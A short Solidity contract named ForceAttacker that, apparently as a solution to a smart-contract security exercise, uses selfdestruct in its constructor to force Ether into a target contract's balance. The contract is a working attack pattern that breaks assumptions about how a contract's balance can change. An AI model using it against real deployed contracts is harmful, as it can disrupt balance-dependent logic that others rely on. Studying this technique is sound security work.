pragma solidity ^0.8.0;

contract ForceAttacker {
    constructor(address _target) payable {
        selfdestruct(payable(_target));
    }
}